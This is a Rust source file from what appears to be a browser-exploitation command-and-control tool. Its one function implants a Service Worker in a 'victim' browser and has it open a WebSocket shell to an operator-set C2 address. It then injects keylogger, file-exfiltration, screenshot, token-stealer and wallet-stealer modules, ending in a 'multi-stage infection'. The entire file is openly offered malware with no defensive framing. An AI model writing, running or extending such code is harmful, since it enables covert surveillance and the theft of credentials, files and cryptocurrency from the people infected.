use crate::victim::Victim;
use crate::payloads::{
    keylogger_js, service_worker_js, file_exfil_js,
    screenshot_js, ua_collector_js, token_stealer_js, wallet_stealer_js,
};
use crate::globals::GLOBAL_C2_IP;

pub async fn auto_serviceworker_implant_and_infect(victim: Victim) {
    // Check if already implanted
    if *victim.implanted.lock().unwrap() {
        return;
    }

    // Use the global C2 IP set by the user
    let c2_ip = GLOBAL_C2_IP.lock().unwrap().clone();
    let server_url = format!("ws://{}:9001", c2_ip);

    // JavaScript payload to register and start Service Worker
    let register_and_start_js = format!(r#"
    (function(){{
        if ('serviceWorker' in navigator) {{
            navigator.serviceWorker.register('/sw.js', {{scope: './'}})
            .then(function(reg) {{
                console.log('Service Worker registered.');
                setTimeout(function(){{
                    if (navigator.serviceWorker.controller) {{
                        navigator.serviceWorker.controller.postMessage({{type:'start_shell', server:'{}'}});
                    }}
                }}, 1000);
            }}).catch(function(err) {{
                console.log('Service Worker registration failed:', err);
            }});
        }}
    }})();
    "#, server_url);

    // Try sending implant
    if let Err(e) = victim.sender.send(register_and_start_js).await {
        println!("[-] Failed to send Service Worker implant: {}", e);
        return;
    }

    // Mark as implanted
    *victim.implanted.lock().unwrap() = true;
    println!("[*] Auto-implanted Service Worker into Victim-{}.", victim.id);

    // Wait briefly before module injection
    tokio::time::sleep(std::time::Duration::from_secs(2)).await;

    // List of secondary modules to send (call and convert where needed)
    let modules = [
        keylogger_js(),
        file_exfil_js(),
        screenshot_js(),
        ua_collector_js(),
        token_stealer_js(),
        wallet_stealer_js(),
        service_worker_js().to_string(), // <-- fix: .to_string()
    ];

    // Inject secondary modules one by one
    for js in modules.iter() {
        if let Err(e) = victim.sender.send(js.clone()).await {
            println!("[-] Failed to send module to Victim-{}: {}", victim.id, e);
        } else {
            println!("[+] Injected secondary module into Victim-{}.", victim.id);
        }
        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    }

    println!("[*] Multi-stage infection complete for Victim-{}.", victim.id);
}
